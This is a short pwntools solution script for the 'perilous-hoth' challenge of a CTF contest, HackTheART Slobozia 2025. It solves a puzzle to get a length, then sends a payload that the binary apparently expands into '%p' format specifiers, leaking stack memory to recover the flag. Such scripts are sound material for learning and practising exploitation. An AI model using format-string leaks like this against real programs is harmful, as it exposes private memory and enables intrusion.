# Challange created by Iustin-Mihail Bichir
# Username: ducky-duck
# Contest: HackTheART Slobozia 2025

from pwn import *

p = process("./perilous-hoth")

# Reading the value of x
p.recvuntil(b'Luke, trust the force: ')
x = int(p.recvline())
print("value of x is: ", x)

# Computing index
index = (x*x - 489*x + 28980) + ((420 + 69 + x) * 5 + 1) % 1025
print("Index =", index)

# Read all the numbers
p.recvuntil(b'Oops, my holocrons identification numbers!\n\n')
numbers_line = p.recvuntil(b"Please").decode().split("\n")[0]
num_list = numbers_line.strip().split()

# print(num_list)

# Computing the required length
mirror = num_list[index]
LENGTH = int(mirror[::-1])
print("Mirror =", mirror, "LENGTH =", LENGTH)

# Continuing
p.recvuntil(b"Selected option: ")
p.sendline(b"1")
p.recvuntil(b"\nEnter search query: ")

# Building a payload, e.g ' P' which will become '%p'
payload = b" P" * (LENGTH//2) + b" " * (LENGTH % 2)
print(payload)
p.sendline(payload)

# Reading the stack contents
rep = p.recvall()
print(rep)

p.close()

# To-Do
# Decoding the hex output, finding the string which contains the flag, swapping the endianness (word length = 8 bytes)
